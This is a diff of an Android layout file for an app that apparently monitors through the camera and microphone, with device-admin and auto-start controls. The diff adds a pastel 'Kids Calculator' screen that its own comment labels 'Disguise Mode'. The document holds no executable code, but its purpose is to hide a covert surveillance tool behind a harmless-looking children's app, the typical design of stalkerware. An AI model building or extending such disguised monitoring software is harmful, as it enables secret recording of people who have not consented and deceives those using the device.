@@ -1,88 +1,325 @@
 <?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:orientation="vertical"
-    android:padding="16dp"
     tools:context=".MainActivity">
 
-    <TextView
-        android:id="@+id/tvStatus"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:layout_gravity="center_horizontal"
-        android:layout_marginBottom="16dp"
-        android:text="Status: Not running"
-        android:visibility="invisible"
-        android:textSize="16sp" />
-
-    <ProgressBar
-        android:id="@+id/progressBar"
-        style="?android:attr/progressBarStyleHorizontal"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:visibility="invisible"
-        android:layout_marginBottom="16dp" />
-
-    <Button
-        android:id="@+id/btnStart"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:visibility="gone"
-        android:text="Start Monitoring (Back Cam)" />
-
+    <!-- Original Monitor Config UI -->
     <LinearLayout
+        android:id="@+id/monitorConfigLayout"
         android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:visibility="gone"
-        android:orientation="horizontal">
+        android:layout_height="match_parent"
+        android:orientation="vertical"
+        android:padding="16dp"
+        android:gravity="center">
+
+        <TextView
+            android:id="@+id/tvStatus"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center_horizontal"
+            android:layout_marginBottom="16dp"
+            android:text="Status: Not running"
+            android:textSize="18sp"
+            android:textStyle="bold" />
+
+        <ProgressBar
+            android:id="@+id/progressBar"
+            style="?android:attr/progressBarStyleHorizontal"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginBottom="24dp" />
 
         <Button
-            android:id="@+id/btnFront"
-            android:layout_width="0dp"
+            android:id="@+id/btnAdmin"
+            android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginStart="8dp"
-            android:layout_weight="1"
-            android:text="Switch to Front Camera" />
+            android:text="Enable Device Admin"
+            android:visibility="gone" />
 
         <Button
-            android:id="@+id/btnBack"
-            android:layout_width="0dp"
+            android:id="@+id/btnAutoStart"
+            android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginEnd="8dp"
-            android:layout_weight="1"
-            android:text="Switch to Back Camera" />
+            android:layout_marginTop="16dp"
+            android:text="Enable Auto Start"
+            android:visibility="gone" />
     </LinearLayout>
 
-    <Button
-        android:id="@+id/btnMic"
+    <!-- Kids Calculator UI (Disguise Mode) -->
+    <LinearLayout
+        android:id="@+id/calculatorLayout"
         android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:visibility="gone"
-        android:text="Mic: OFF" />
+        android:layout_height="match_parent"
+        android:orientation="vertical"
+        android:background="@color/calc_bg"
+        android:padding="16dp"
+        android:visibility="gone">
 
-    <Button
-        android:id="@+id/btnStop"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:visibility="gone"
-        android:text="Stop Monitoring" />
+        <!-- Cute App Bar / Header -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="center"
+            android:layout_marginBottom="12dp">
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="🧸 Kids Calculator 🎈"
+                android:textSize="22sp"
+                android:textStyle="bold"
+                android:textColor="#FF4A5568" />
+        </LinearLayout>
 
-    <Button
-        android:id="@+id/btnAdmin"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:layout_marginTop="32dp"
-        android:visibility="invisible"
-        android:text="Enable Device Admin" />
+        <!-- Display Card -->
+        <androidx.cardview.widget.CardView
+            android:layout_width="match_parent"
+            android:layout_height="0dp"
+            android:layout_weight="1"
+            android:layout_marginBottom="16dp"
+            app:cardCornerRadius="24dp"
+            app:cardElevation="4dp"
+            app:cardBackgroundColor="@color/calc_display_bg">
 
-    <Button
-        android:id="@+id/btnAutoStart"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:layout_marginTop="16dp"
-        android:visibility="gone"
-        android:text="Enable Auto Start" />
+            <LinearLayout
+                android:layout_width="match_parent"
+                android:layout_height="match_parent"
+                android:orientation="vertical"
+                android:gravity="bottom"
+                android:padding="20dp">
 
-</LinearLayout>
+                <!-- History View -->
+                <TextView
+                    android:id="@+id/tvCalcHistory"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:gravity="end"
+                    android:text=""
+                    android:textColor="#FF718096"
+                    android:textSize="20sp"
+                    android:layout_marginBottom="8dp" />
+
+                <!-- Current Input Display -->
+                <TextView
+                    android:id="@+id/tvCalcDisplay"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:gravity="end"
+                    android:text="0"
+                    android:textColor="#FF2D3748"
+                    android:textSize="44sp"
+                    android:textStyle="bold" />
+            </LinearLayout>
+        </androidx.cardview.widget.CardView>
+
+        <!-- TableLayout for calculator buttons -->
+        <TableLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:stretchColumns="*">
+
+            <!-- Row 1: C, Backspace, %, / -->
+            <TableRow android:layout_marginBottom="10dp">
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnC"
+                    android:text="C"
+                    android:textSize="22sp"
+                    android:textColor="#FFFFFFFF"
+                    app:backgroundTint="@color/pastel_orange"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnDelete"
+                    android:text="⌫"
+                    android:textSize="22sp"
+                    android:textColor="#FFFFFFFF"
+                    app:backgroundTint="@color/pastel_orange"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnPercent"
+                    android:text="%"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_lilac"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnDivide"
+                    android:text="÷"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_lilac"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+            </TableRow>
+
+            <!-- Row 2: 7, 8, 9, x -->
+            <TableRow android:layout_marginBottom="10dp">
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn7"
+                    android:text="7"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_yellow"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn8"
+                    android:text="8"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_yellow"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn9"
+                    android:text="9"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_yellow"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnMultiply"
+                    android:text="×"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_lilac"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+            </TableRow>
+
+            <!-- Row 3: 4, 5, 6, - -->
+            <TableRow android:layout_marginBottom="10dp">
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn4"
+                    android:text="4"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_green"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn5"
+                    android:text="5"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_green"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn6"
+                    android:text="6"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_green"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnMinus"
+                    android:text="-"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_lilac"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+            </TableRow>
+
+            <!-- Row 4: 1, 2, 3, + -->
+            <TableRow android:layout_marginBottom="10dp">
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn1"
+                    android:text="1"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_blue"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn2"
+                    android:text="2"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_blue"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn3"
+                    android:text="3"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_blue"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnPlus"
+                    android:text="+"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_lilac"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+            </TableRow>
+
+            <!-- Row 5: +/- , 0, ., = -->
+            <TableRow android:layout_marginBottom="10dp">
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnToggleSign"
+                    android:text="±"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_pink"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btn0"
+                    android:text="0"
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_pink"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnDot"
+                    android:text="."
+                    android:textSize="22sp"
+                    android:textColor="#FF2D3748"
+                    app:backgroundTint="@color/pastel_pink"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnEquals"
+                    android:text="="
+                    android:textSize="22sp"
+                    android:textColor="#FFFFFFFF"
+                    app:backgroundTint="@color/pastel_teal"
+                    app:cornerRadius="24dp"
+                    android:layout_margin="5dp"
+                    android:height="68dp"/>
+            </TableRow>
+        </TableLayout>
+    </LinearLayout>
+</FrameLayout>
